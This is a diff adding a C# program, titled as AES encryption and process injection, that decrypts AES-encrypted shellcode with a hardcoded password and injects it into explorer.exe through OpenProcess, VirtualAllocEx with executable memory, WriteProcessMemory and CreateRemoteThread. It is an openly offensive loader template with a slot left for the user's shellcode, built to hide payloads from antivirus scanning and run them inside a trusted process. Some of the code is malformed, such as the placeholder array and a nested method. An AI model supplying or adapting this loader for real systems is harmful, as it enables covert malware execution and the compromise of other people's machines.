@@ -1,0 +1,95 @@
+//AES Encryption and Process Injection 
+AES Process Injection:
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Security.Cryptography;
+using System.IO;
+
+
+
+namespace AESDecProcInj
+{
+    class Program
+    {
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+    processId);
+
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+        dwSize, uint flAllocationType, uint flProtect);
+
+
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+    byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+    lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
+    dwCreationFlags, IntPtr lpThreadId);
+
+        static void Main()
+        {
+            byte[] passwordBytes = Encoding.UTF8.GetBytes("This!sMyP@SS");
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+            byte[] aesshellcode = new byte[1] { //your-shellcode-here};
+            byte[] shellcode = AES_Decrypt(aesshellcode, passwordBytes);
+
+
+            Process[] processes = Process.GetProcessesByName("explorer");
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processes[0].Id);
+
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+            IntPtr outSize;
+            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
+IntPtr.Zero, 0, IntPtr.Zero);
+
+
+
+
+
+            //Decryption Method
+            static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
+            {
+                byte[] decryptedBytes = null;
+                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (RijndaelManaged AES = new RijndaelManaged())
+                    {
+                        AES.KeySize = 256;
+                        AES.BlockSize = 128;
+
+                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                        AES.Key = key.GetBytes(AES.KeySize / 8);
+                        AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                        AES.Mode = CipherMode.CBC;
+
+                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
+                        {
+                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+                            cs.Close();
+                        }
+                        decryptedBytes = ms.ToArray();
+                    }
+                }
+
+                return decryptedBytes;
+            }
+
+        }
+    }
+}
+
